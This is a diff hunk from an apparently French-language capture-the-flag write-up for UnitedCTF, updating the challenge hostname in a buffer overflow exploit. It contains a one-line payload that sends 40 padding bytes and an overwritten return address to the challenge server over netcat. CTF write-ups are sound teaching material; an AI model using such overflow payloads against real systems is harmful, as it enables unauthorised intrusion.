@@ -58,7 +58,7 @@ On peut voir que la valeur `0x00401242` se trouve 40 bytes après le début de n
 Nous avons maintenant toutes les informations nécessaires pour exploiter le programme et pouvons envoyer notre _payload_.
 
 ```
-python2 -c 'print("A"*40 + "\x56\x11\x40\x00")' | nc unitedctf.ca 17001
+python2 -c 'print("A"*40 + "\x56\x11\x40\x00")' | nc challenges.unitedctf.ca 17001
 
 ou bien
 
